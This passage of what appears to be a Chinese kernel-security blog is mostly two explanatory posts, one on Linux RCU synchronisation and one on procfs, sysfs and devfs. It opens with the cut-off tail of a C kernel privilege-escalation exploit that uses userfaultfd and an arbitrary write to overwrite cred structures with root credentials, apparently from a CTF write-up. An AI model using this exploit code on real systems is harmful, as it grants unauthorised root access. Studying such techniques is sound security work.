j++)</span><br><span class="line">                uint_ptr[i+j] = <span class="number">0</span>;</span><br><span class="line">            cred_count++;</span><br><span class="line">            <span class="keyword">if</span>(cred_count &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                cred_offset = i*<span class="number">4</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cred_offset == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;can&#x27;t find cred&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">char</span> * write_ptr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(write_ptr, read_ptr, SEARCH_SIZE);</span><br><span class="line"></span><br><span class="line">    fault_page = (<span class="keyword">uint64_t</span>)write_ptr + SEARCH_SIZE;</span><br><span class="line">    fault_page_len = DATA_OFFSET - SEARCH_SIZE;</span><br><span class="line">    register_userfault();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write root cred back&quot;</span>);</span><br><span class="line">    kwrite(<span class="number">0</span>, write_ptr, DATA_OFFSET, -DATA_OFFSET);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Linux RCU机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-27 19:52:42" itemprop="dateCreated datePublished" datetime="2022-10-27T19:52:42+08:00">2022-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-02 15:13:54" itemprop="dateModified" datetime="2022-11-02T15:13:54+08:00">2022-11-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>RCU 简述</strong></p>
<p>RCU(Read-Copy Update)，是 Linux 中比较重要的一种同步机制，特点如下：</p>
<ul>
<li>复制后更新：但更新数据的时候，需要先复制一份副本，在副本上完成修改，再一次性地替换旧数据”（替换数据时需要其他同步机制的保护）</li>
<li>延迟回收内存：在数据被删除后（节点脱链）销毁前（释放空间），需要等待其他读线程停止使用该数据</li>
</ul>
<p>复制后更新是 Linux 内核实现的一种针对“读多写少”的共享数据的同步机制：</p>
<ul>
<li>不同于其他的同步机制，它允许多个读者同时访问共享数据，而且读者的性能不会受影响</li>
<li>读者与写者之间也不需要同步机制，但需要“复制后再写”</li>
<li>但如果存在多个写者时，写者与写者之间需要利用其他同步机制保证同步</li>
</ul>
<p>延迟回收内存是为了防止已经被销毁的数据被其他线程使用：</p>
<ul>
<li>一个位于临界区的指针被释放之后，另一个线程如果使用该指针就会产生安全问题</li>
</ul>
<p><strong>RCU 作用</strong></p>
<p>RCU 的一个典型的应用场景是链表，主要解决以下问题：</p>
<ul>
<li>在读取过程中，另外一个线程删除了一个节点：<ul>
<li>删除线程可以把这个节点从链表中移除，但它不能直接销毁这个节点，必须等到所有的读取线程读取完成以后，才进行销毁操作</li>
<li>RCU 中把这个过程称为宽限期（Grace period）</li>
</ul>
</li>
<li>在读取过程中，另外一个线程插入了一个新节点<ul>
<li>需要保证读到的这个节点是完整的（得到的要么全是旧的数据，要么全是新的数据，反正不会是半新半旧的数据）</li>
<li>这里涉及到了发布-订阅机制（Publish-Subscribe Mechanism）     </li>
</ul>
</li>
<li>保证读取链表的完整性<ul>
<li>新增或者删除一个节点，不至于导致其他正在遍历该链表的线程从中间断开</li>
<li>但是 RCU 并不保证一定能读到新增的节点或者不读到要被删除的节点</li>
</ul>
</li>
</ul>
<p><strong>RCU API</strong></p>
<p>添加链表项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_next_rcu(list)	(*((struct list_head __rcu **)(&amp;(list)-&gt;next))) <span class="comment">/* 返回&amp;(list)-&gt;next),但不能直接访问它 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">		struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next)) <span class="comment">/* 检查一个节点是否可用 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span>-&gt;next = next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">	next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125; <span class="comment">/* 在prev和next中间插入new,但提供了RCU的保护 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>除了 <code>rcu_assign_pointer</code> 函数，其他地方和普通的 <code>__list_add</code> 没什么不同，该函数的底层应该是一个内存屏障（防止 CPU 优化执行顺序），以避免在新指针 new 准备好之前，就被引用了</li>
</ul>
<p>删除链表项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_rcu</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__list_del_entry(entry);</span><br><span class="line">	entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>和 <code>list_del</code> 相比，<code>list_del_rcu</code> 只对 <code>entry-&gt;prev</code> 进行了处理（目前不知道原因） </li>
</ul>
<p>更新链表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_replace_rcu</span><span class="params">(struct list_head *old,</span></span></span><br><span class="line"><span class="params"><span class="function">				struct list_head *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">new</span>-&gt;next = old-&gt;next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = old-&gt;prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(<span class="keyword">new</span>-&gt;prev), <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">new</span>-&gt;next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">	old-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>同样也是只对 <code>old-&gt;prev</code> 进行了处理</li>
</ul>
<p>访问链表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rcu_read_lock(); <span class="comment">/* 声明了一个读端的临界区(read-side critical sections) */</span></span><br><span class="line">list_for_each_entry_rcu(pos, head, member) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br></pre></td></tr></table></figure>
<ul>
<li><code>rcu_read_lock</code> 和 <code>rcu_read_unlock</code> 用来标识 RCU read side 临界区（其作用就是帮助检测宽限期是否结束）</li>
</ul>
<p><strong>RCU 机制</strong></p>
<p>宽限期：（Grace period）</p>
<img src="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/1666865836143.png" class width="1666865836143"> 
<ul>
<li>宽限期的意义是，在一个删除动作发生后，它必须等待所有在宽限期开始前已经开始的 Reader 线程结束，才可以进行销毁操作（例如：Reader1，Reader2）</li>
<li>删除之后，Reader 就会读取新数据，从而拿不到旧数据中的指针，因此就不用考虑安全问题</li>
<li>用于判定宽限期开始的函数如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">synchronize_rcu</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	RCU_LOCKDEP_WARN(lock_is_held(&amp;rcu_bh_lock_map) ||</span><br><span class="line">			 lock_is_held(&amp;rcu_lock_map) ||</span><br><span class="line">			 lock_is_held(&amp;rcu_sched_lock_map),</span><br><span class="line">			 <span class="string">&quot;Illegal synchronize_rcu() in RCU read-side critical section&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(synchronize_rcu);</span><br></pre></td></tr></table></figure>
<ul>
<li>检测宽限期是否结束的操作很复杂，需要利用 <code>rcu_read_lock</code> 和 <code>rcu_read_unlock</code> 所标记的区域进行判断</li>
<li>宽限期是 RCU 实现中最复杂的部分，要求在提高读数据性能的同时，删除数据的性能也不能太差</li>
</ul>
<p>发布-订阅机制：（Publish-Subscribe Mechanism）    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">		struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next)) <span class="comment">/* 检查一个节点是否可用 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span>-&gt;next = next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">	next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125; <span class="comment">/* 在prev和next中间插入new,但提供了RCU的保护 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发布-订阅机制其实就是 <code>rcu_assign_pointer</code> 函数的使用，用于解决优化导致的 CPU 执行顺序问题</li>
<li>对应宏函数如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_assign_pointer(p, v)					      \</span></span><br><span class="line"><span class="meta">(&#123;									      \</span></span><br><span class="line"><span class="meta">	uintptr_t _r_a_p__v = (uintptr_t)(v);				      \</span></span><br><span class="line"><span class="meta">									      \</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> (__builtin_constant_p(v) &amp;&amp; (_r_a_p__v) == (uintptr_t)NULL)	      \</span></span><br><span class="line"><span class="meta">		WRITE_ONCE((p), (typeof(p))(_r_a_p__v));		      \</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">else</span>								      \</span></span><br><span class="line"><span class="meta">		smp_store_release(&amp;p, RCU_INITIALIZER((typeof(p))_r_a_p__v)); \</span></span><br><span class="line"><span class="meta">	_r_a_p__v;							      \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实我看不太懂这个函数，但它的功能和内存屏障很像，因此它的底层也极有可能是一个内存屏障</li>
</ul>
<p>复制更新机制：（Copy Update）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="comment">/* 将要被替换的对象 */</span></span><br><span class="line">q = kmalloc(<span class="keyword">sizeof</span>(*p), GFP_KERNEL);</span><br><span class="line">*q = *p;</span><br><span class="line">q-&gt;field = new_value;</span><br><span class="line">list_replace_rcu(&amp;p-&gt;<span class="built_in">list</span>, &amp;q-&gt;<span class="built_in">list</span>);</span><br><span class="line">synchronize_rcu();</span><br><span class="line">kfree(p);</span><br></pre></td></tr></table></figure>
<ul>
<li>复制更新机制的实现基于宽限期（等待之前拿到旧节点的 Reader 执行结束，然后释放旧节点，之后拿到新节点的 Reader 不受影响）</li>
<li><code>synchronize_rcu</code> 可以防止在 <code>list_replace_rcu</code> 之后，<code>kfree</code> 之前，有读线程使用了正在进行更新的链表节点</li>
<li>更新以后的旧节点脱链，拿到旧节点的 Reader 在宽限期中执行完毕，之后的 <code>kfree</code> 就不会引发安全问题了</li>
<li>PS：申请空间和复制数据的操作需要手动完成，没有专门的 API</li>
</ul>
<p><strong>RCU 案例</strong></p>
<p>Reader 正在遍历查找链表节点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">long</span> key, <span class="keyword">int</span> *result)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">el</span> *<span class="title">p</span>;</span></span><br><span class="line">    </span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    list_for_each_entry_rcu(p, head, lp) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;key == key) &#123;</span><br><span class="line">            *result = p-&gt;data;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Writer 正在遍历删除链表节点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">(<span class="keyword">long</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">el</span> *<span class="title">p</span>;</span></span><br><span class="line">    </span><br><span class="line">    spin_lock(&amp;listmutex);</span><br><span class="line">    list_for_each_entry_rcu(p, head, lp) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;key == key) &#123;</span><br><span class="line">            list_del_rcu(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">            synchronize_rcu(); </span><br><span class="line">            spin_unlock(&amp;listmutex);</span><br><span class="line">            kfree(p);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;listmutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设一个线程执行 Reader，另一个线程执行 Writer：</p>
<ul>
<li>如果使用读写锁，那么 Reader 和 Writer 就不能同时进行，影响效率</li>
<li>如果使用顺序锁，那么在 Reader 和 Writer 同时操作指针时容易出现问题</li>
<li>这里使用了 RCU 锁，Writer 会在 <code>synchronize_rcu</code> 上等待持有旧指针的 Reader 执行完毕，只是牺牲了 Writer 的效率就避免了安全问题</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113999842">rcu 机制简介 - 知乎</a> </li>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1006204">深入理解 Linux 的 RCU 机制 - 腾讯云开发者社区</a> </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/26/Linux%20%E4%BC%AA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/26/Linux%20%E4%BC%AA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" class="post-title-link" itemprop="url">Linux 伪文件系统</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-26 22:28:56 / Modified: 22:29:54" itemprop="dateCreated datePublished" datetime="2022-10-26T22:28:56+08:00">2022-10-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Procfs"><a href="#Procfs" class="headerlink" title="Procfs"></a>Procfs</h2><p>procfs 被称为 “进程文件系统” 或 “伪文件系统”，它是一个控制中心，可以通过更改其中某些文件改变内核运行状态，它也是内核提空给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息</p>
<ul>
<li>procfs 放置的数据都是在内存当中（例如：系统内核、进程、外部设备的状态及网络状态等），因为这个目录下的数据都是在内存当中，所以本身不占任何硬盘空间</li>
</ul>
<p>procfs 为 Linux 中的许多命令提供了信息，例如：<code>lsmod</code> 的命令和 <code>cat /proc/modules</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ lsmod           </span><br><span class="line">Module                  Size  Used by</span><br><span class="line">isofs                  49152  1</span><br><span class="line">xt_conntrack           16384  3</span><br><span class="line">xt_MASQUERADE          20480  3</span><br><span class="line">nf_conntrack_netlink    49152  0</span><br><span class="line">nfnetlink              20480  2 nf_conntrack_netlink</span><br><span class="line">xfrm_user              40960  1</span><br><span class="line">xfrm_algo              16384  1 xfrm_user</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ cat /proc/modules</span><br><span class="line">isofs 49152 1 - Live 0x0000000000000000</span><br><span class="line">xt_conntrack 16384 3 - Live 0x0000000000000000</span><br><span class="line">xt_MASQUERADE 20480 3 - Live 0x0000000000000000</span><br><span class="line">nf_conntrack_netlink 49152 0 - Live 0x0000000000000000</span><br><span class="line">nfnetlink 20480 2 nf_conntrack_netlink, Live 0x0000000000000000</span><br><span class="line">xfrm_user 40960 1 - Live 0x0000000000000000</span><br><span class="line">xfrm_algo 16384 1 xfrm_user, Live 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>procfs 通过 VFS 把内核的抽象文件作为常规文件映射到一个目录树中：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ls /proc                </span><br><span class="line">1     127   146   20    230   262   33    44   96             locks</span><br><span class="line">10    128   147   2004  231   263   338   45   963            mdstat</span><br><span class="line">100   1281  148   2010  232   264   339   46   964            meminfo</span><br><span class="line">101   129   1485  2037  233   265   34    465  965            misc</span><br><span class="line">102   13    1491  2046  234   266   3438  5    97             modules</span><br><span class="line">103   130   15    2061  235   267   3453  568  98             mounts</span><br><span class="line">1038  1308  150   2073  236   268   3462  613  99             mpt</span><br><span class="line">105   131   151   2081  237   269   3505  7    acpi           mtrr</span><br><span class="line">107   1310  152   2089  238   27    3510  755  bootconfig     net</span><br><span class="line">108   132   153   2092  239   270   36    756  buddyinfo      pagetypeinfo</span><br><span class="line">11    1322  1538  2094  2393  271   37    772  bus            partitions</span><br><span class="line">110   133   154   21    2397  272   379   778  cgroups        pressure</span><br><span class="line">111   1337  158   2104  24    273   38    793  cmdline        schedstat</span><br><span class="line">112   134   16    2108  240   274   3827  794  consoles       scsi</span><br><span class="line">113   135   1640  2109  2408  275   39    797  cpuinfo        self</span><br><span class="line">114   136   166   2110  241   276   3914  801  crypto         slabinfo</span><br><span class="line">115   1360  1671  2113  242   277   3929  803  devices        softirqs</span><br><span class="line">116   1362  169   2117  243   278   3932  805  diskstats      stat</span><br><span class="line">117   137   17    2124  244   279   3996  806  dma            swaps</span><br><span class="line">1171  1377  170   2125  245   28    3997  812  driver         sys</span><br><span class="line">1177  138   171   2128  246   280   4     813  dynamic_debug  sysrq-trigger</span><br><span class="line">118   1383  173   2133  247   281   40    816  execdomains    sysvipc</span><br><span class="line">119   139   178   2138  248   282   4036  820  fb             thread-self</span><br><span class="line">12    1390  18    2145  249   283   408   825  filesystems    timer_list</span><br><span class="line">120   1397  19    2150  25    284   409   827  fs             tty</span><br><span class="line">121   14    1905  2156  250   285   41    829  interrupts     uptime</span><br><span class="line">1212  140   1910  2157  251   286   412   830  iomem          version</span><br><span class="line">1214  141   1934  2161  252   2867  413   835  ioports        version_signature</span><br><span class="line">122   1410  1941  2182  253   287   414   841  irq            vmallocinfo</span><br><span class="line">1225  1419  1954  2193  254   288   415   861  kallsyms       vmstat</span><br><span class="line">123   142   1974  2197  255   3     416   874  kcore          zoneinfo</span><br><span class="line">1233  1422  1978  22    256   30    417   88   keys</span><br><span class="line">1236  1423  1979  226   257   307   418   884  key-users</span><br><span class="line">1238  1426  1981  2264  258   308   419   9    kmsg</span><br><span class="line">124   143   1986  227   259   31    42    913  kpagecgroup</span><br><span class="line">1240  145   1995  2274  26    315   420   932  kpagecount</span><br><span class="line">125   1455  1999  229   260   316   423   942  kpageflags</span><br><span class="line">126   1459  2     2294  261   32    43    95   loadavg</span><br></pre></td></tr></table></figure>
<h2 id="Sysfs"><a href="#Sysfs" class="headerlink" title="Sysfs"></a>Sysfs</h2><p>sysfs 包括系统所有的硬件信息以及内核模块等信息（为设备驱动服务）</p>
<p>Linux-2.6-kernel 中增加了一个引人注目的新特性：统一设备模型 device model</p>
<ul>
<li>统一设备模型的最初动机是为了实现智能的电源管理，linux 内核为了实现智能电源管理，需要建立表示系统中所有设备拓扑关系的树结构</li>
<li>这样在关闭电源时，可以从树的节点开始关闭</li>
</ul>
<p>统一设备模型的核心部分就是设备驱动模型 kobject，它就是 device model 拓扑树中的各个节点</p>
<p>而 sysfs 为我们提供 kobject 对象层次结构的视图，帮助用户可以以一个简单文件系统的方式来观察各种设备的拓扑结构：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  / ls sys </span><br><span class="line">block  bus  class  dev  devices  firmware  fs  hypervisor  kernel  module  power</span><br></pre></td></tr></table></figure>
<ul>
<li>在 sysfs 中的每个目录项都是一个 kobject</li>
<li>相比于 procfs，使用 sysfs 导出内核数据的方式更为统一，因此 sysfs 替代了 procfs 中有关设备驱动的部分（新设计的内核机制应该尽量使用 sysfs 机制）</li>
</ul>
<h2 id="Devfs"><a href="#Devfs" class="headerlink" title="Devfs"></a>Devfs</h2><p>devfs 被称为设备文件系统</p>
<p>devfs 将所有系统中的设备以动态文件系统命名空间呈现，devfs 也可以通过内核设备驱动直接管理这些命名空间和接口，以此来提供智能的设备管理（包括设备入口注册/注销）</p>
<ul>
<li>sysfs 是以面向对象的方式提供了 device model 的可视化结构</li>
<li>devfs 是为了给设备提供进行 IO 操作的接口</li>
</ul>
<p>因此，当我们需要操控某个设备的时候，需要使用对应的 API 来进行注册/注销：</p>
<ul>
<li>注册符号设备：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> first, <span class="keyword">unsigned</span> <span class="keyword">int</span> count, <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unregister_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> first, <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
